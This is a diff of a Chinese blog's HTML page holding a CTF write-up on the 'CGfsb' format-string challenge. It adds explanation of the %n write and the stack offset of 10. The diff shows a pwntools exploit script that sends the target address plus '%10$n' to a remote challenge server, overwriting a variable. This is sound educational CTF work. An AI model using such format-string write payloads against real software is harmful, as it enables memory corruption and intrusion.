@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CGfsb_wp, 矢坕个人博客">
+    <meta name="keywords" content="CGfsb_wp——格式化字符串漏洞, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CGfsb_wp | 矢坕个人博客</title>
+    <title>CGfsb_wp——格式化字符串漏洞 | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CGfsb_wp</h1>
+                    <h1 class="description center-align post-title">CGfsb_wp——格式化字符串漏洞</h1>
                 </div>
             </div>
         </div>
@@ -454,14 +454,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-08
+                    2023-09-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    440
+                    514
                 </div>
                 
 
@@ -496,11 +496,11 @@
 %c - 字符 - 输出字符
 %p - 指针 - 指针地址
 %n - 到目前为止所写的字符数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>特别注意%n，它的功能是将%n之前打印出来的字符个数，赋值给一个变量比如：<br><img src="/images/CGfsb-wp/3.png"><br>a的值被改变了<br>也就是说他在某种特定环境下可以作为一个scanf来使用（不懂这个打死都别想做出来）<br>我们需要将pwnme的地址输入到s的空间去，在合适的位置上加一个%n，使其与我们输入的地址对应，从而造成漏洞利用<br>所以接下来的问题变成了如何让他们对应起来<br>对其运行输入<br><img src="/images/CGfsb-wp/4.png"><br>发现偏移量为10<br>上exp</p>
+<p>特别注意%n，它的功能是将%n之前打印出来的字符个数，赋值给一个变量比如：<br><img src="/images/CGfsb-wp/3.png"><br>a的值被改变了<br>也就是说他在某种特定环境下可以作为一个scanf来使用（不懂这个打死都别想做出来）<br>比如这里的偏移量为10，<strong>指的是输入的数据会作为printf的调用栈空间的第10个参数</strong>（在缓冲区的数据在第10个参数）<br>我们需要将pwnme的地址输入到s的空间去，在合适的位置上加一个%n，使其与我们输入的地址对应，从而造成漏洞利用<br>所以接下来的问题变成了如何让他们对应起来<br>对其运行输入<br><img src="/images/CGfsb-wp/4.png"><br>发现偏移量为10<br>上exp</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">56143</span><span class="token punctuation">)</span>
 pwnme<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A068</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span>pwnme<span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">b'%10$n'</span>
+payload<span class="token operator">=</span>pwnme<span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">b'%10$n'</span><span class="token comment">#pwnme和aaaa正好组成8个字符，%10$n是对第10个参数进行定位，然后更改其数值</span>
 io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:\n"</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please:\n"</span><span class="token punctuation">)</span>
@@ -1062,7 +1062,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">51.1k</span>&nbsp;字
+                class="white-color">52.9k</span>&nbsp;字
             
             
             
